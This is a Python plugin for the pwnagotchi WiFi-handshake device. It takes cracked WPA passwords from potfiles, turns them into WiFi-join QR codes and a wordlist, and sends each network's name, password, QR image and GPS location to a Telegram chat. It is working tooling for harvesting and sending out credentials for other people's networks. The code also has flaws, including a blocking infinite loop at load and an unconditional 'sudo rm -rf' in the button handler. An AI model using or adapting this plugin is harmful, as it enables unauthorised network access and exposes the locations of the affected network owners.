#takes cracked hashes, makes qr codes and a wordlist, and will send qrcode, and send the login info also
#the location if possible all to your telegram. potfile processing and the idea to use qr codes taken from mycracked_pw and the idea to use telegram from WPA2s telegram plugin
from pwnagotchi import config
from PIL import Image
import pwnagotchi, logging, qrcode, json, html, csv, os, io, glob, telegram, time, subprocess
import pwnagotchi.plugins as plugins#unneeded button stuff
import RPi.GPIO as GPIO

class qt(plugins.Plugin):
    __author__ = 'NeonLightning'
    __version__ = '0.2.1'
    __license__ = 'GPL3'
    __description__ = 'takes cracked info and sends it over telegram with qr codes and location'
    
    #unneeded buttons stuff.
    KEY_PRESS_PIN = 13
    KEY1_PIN = 21
    KEY2_PIN = 20
    KEY3_PIN = 16

    def __init__(self):
        #unneeded buttons stuff.
        GPIO.setmode(GPIO.BCM)
        GPIO.setup(self.KEY_PRESS_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)
        GPIO.setup(self.KEY1_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)
        GPIO.setup(self.KEY2_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)
        GPIO.setup(self.KEY3_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)
        
    def on_loaded(self):
        self.qrcode_dir = '/home/pi/qrcodes/'
        self.bot_token = config['main']['plugins']['qt']['bot_token']
        self.chat_id = config['main']['plugins']['qt']['chat_id']
        self.cracked = "/home/pi/wordlists/cracked.txt"
        self.bot = telegram.Bot(token=self.bot_token)
        self.last_files = set()
        self.all_bssid=[]
        self.all_ssid=[]
        self.all_passwd=[]
        self.loaded = True
        logging.info("[qt] loaded")
        if not os.path.exists('/home/pi/qrcodes/'):
            os.makedirs('/home/pi/qrcodes/')
        while self.loaded:
            self._buttons_()
                
    #unneeded buttons stuff.                
    @staticmethod
    def get_input(pin):
        return not GPIO.input(pin)
        
    def on_unloaded(self):
        logging.info("[qt] done")
        return
        
    def _read_wpa_sec_file(self):
        wpa_sec_filepath = '/root/handshakes/wpa-sec.cracked.potfile'
        try:
            with open(wpa_sec_filepath, 'r+', encoding='utf-8') as f:
                for line_f in f:
                    pwd_f = line_f.split(':')
                    self.all_passwd.append(str(pwd_f[-1].rstrip('\n')))
                    self.all_bssid.append(str(pwd_f[0]))
                    self.all_ssid.append(str(pwd_f[-2]))
        except:
            logging.error('[qt] encountered a problem in wpa-sec.cracked.potfile')

    def _read_onlinehashcrack_file(self):
        onlinehashcrack_filepath = '/root/handshakes/onlinehashcrack.cracked'
        try:
            with open(onlinehashcrack_filepath, 'r+', encoding='utf-8') as h:
                for line_h in csv.DictReader(h):
                    pwd_h = str(line_h['password'])
                    bssid_h = str(line_h['BSSID'])
                    ssid_h = str(line_h['ESSID'])
                    if pwd_h and bssid_h and ssid_h:
                        self.all_passwd.append(pwd_h)
                        self.all_bssid.append(bssid_h)
                        self.all_ssid.append(ssid_h)
        except:
            logging.error('[qt] encountered a problem in onlinehashcrack.cracked')

    def _generate_qr_code(self, bssid, ssid, password):
        if not os.path.exists('/home/pi/qrcodes/'):
            os.makedirs('/home/pi/qrcodes/')
            self.qrcode_dir = '/home/pi/qrcodes/'
        png_filepath = os.path.join("/home/pi/qrcodes/", f"{ssid}-{password}-{bssid.lower().replace(':', '')}.png")
        filename = f"{ssid}-{password}-{bssid.lower().replace(':', '')}.png"
        if os.path.exists(png_filepath):
            return
        qrlist_path = "/home/pi/.qrlist"
        if os.path.exists(qrlist_path):
            with open(qrlist_path, 'r') as qrlist_file:
                qrlist = qrlist_file.read().splitlines()
                if filename in qrlist:
                    return
        qr_data = f"WIFI:T:WPA;S:{html.escape(ssid)};P:{html.escape(password)};;"
        qr_code = qrcode.QRCode(
            version=None,
            error_correction=qrcode.constants.ERROR_CORRECT_L,
            box_size=10,
            border=4,
        )
        qr_code.add_data(qr_data)
        qr_code.make(fit=True)
        try:
            qrlist_filepath = "/home/pi/.qrlist"
            if os.path.exists(qrlist_filepath):
                with open(qrlist_filepath, 'r') as qrlist_file:
                    qrlist = qrlist_file.read().splitlines()
                    if png_filepath in qrlist:
                        return
            img = qr_code.make_image(fill_color="yellow", back_color="black")
            img.save(png_filepath)
            logging.info(f"[qt] generated and saved for {ssid}-{password}-{bssid.lower().replace(':', '')}")
        except Exception as e:
            logging.error(f"[qt] something went wrong generating QR code for {ssid}-{password}-{bssid.lower().replace(':', '')}: {e}")
    
    def _add_password_to_file(self, password):
        with open(self.cracked, 'a+') as passwords_file:
            passwords_file.seek(0)
            passwords = passwords_file.read().splitlines()
            if password not in passwords:
                passwords_file.write(password + '\n')

    def _update_all(self):
        self._read_wpa_sec_file()
        self._read_onlinehashcrack_file()
        for bssid, ssid, password in zip(self.all_bssid, self.all_ssid, self.all_passwd):
            self._generate_qr_code(bssid, ssid, password)
            self._add_password_to_file(password)

    def on_internet_available(self, agent):
        time.sleep(1)
        self._update_all()
        self._send_qr_codes()

    def _buttons_(self):
        if self.get_input(self.KEY_PRESS_PIN) != 0:
            if self.get_input(self.KEY3_PIN) != 0:
                logging.info(f"resetting service(auto)")
                pwnagotchi.restart('auto')
            if self.get_input(self.KEY1_PIN) != 0:
                logging.info(f"reboot")
                subprocess.run(['sudo', 'reboot'])
            if self.get_input(self.KEY2_PIN) != 0:
                logging.info(f"shutdown")
                subprocess.run(['sudo', 'shutdown', '-h', 'now'])
            logging.info(f"resend telegram qrcodes")
            subprocess.run(['sudo', 'rm', '-rf', '/home/pi/qrcodes', '/home/pi/.qrlist'])

    def send_qrcode_file(self, filename):
        qrlist_path = "/home/pi/.qrlist"
        if os.path.exists(qrlist_path):
            with open(qrlist_path, 'r') as qrlist_file:
                qrlist = qrlist_file.read().splitlines()
                if filename in qrlist:
                    return
        ssid_n_pass = filename.rsplit('-', 1)[-2]
        bssid = filename.rsplit('-', 1)[-1].rsplit('.', 1)[0].lower().replace(':', '')
        geojson_files = glob.glob(f"/root/handshakes/*_{bssid}.geo.json")
        if geojson_files:
            with open(f"/home/pi/qrcodes/{filename}", 'rb') as f, open(geojson_files[0], 'r') as f_geojson:
                data = json.load(f_geojson)
                lat = data['location']['lat']
                lng = data['location']['lng']
                self.bot.send_message(self.chat_id, f"VVV  {ssid_n_pass} Lat: {lat}, Lng: {lng}")
                self.bot.send_photo(self.chat_id, f)
                time.sleep(1)
        else:
            with open(f"/home/pi/qrcodes/{filename}", 'rb') as f:
                self.bot.send_message(self.chat_id, f"VVV  Sending file {ssid_n_pass}, Unknown Location")
                self.bot.send_photo(self.chat_id, f)
                time.sleep(1)
        with open(qrlist_path, 'a') as qrlist_file:
            qrlist_file.write(filename + '\n')

    def _send_qr_codes(self):
        dir_path = "/home/pi/qrcodes"
        if not os.path.exists(dir_path):
            os.makedirs(dir_path)
        qrlist_path = "/home/pi/.qrlist"
        if not os.path.exists(qrlist_path):
            open(qrlist_path, 'a+').close()
        sent_files = set()
        with open(qrlist_path, 'r') as f:
            content = f.read().strip()
            if content:
                sent_files = set(content.split('\n'))
        current_files = set(f for f in os.listdir('/home/pi/qrcodes') if f.endswith('.png'))
        new_files = current_files - sent_files
        if new_files:
            self._update_all()
            for filename in new_files:
                if filename not in sent_files:
                    self.send_qrcode_file(filename)
                    sent_files.add(filename)
            with open(qrlist_path, 'w') as f:
                f.write('\n'.join(sent_files))
                
    def on_unload(self, agent):
        logging.info(f"[qt] unloading")
        self.loaded = False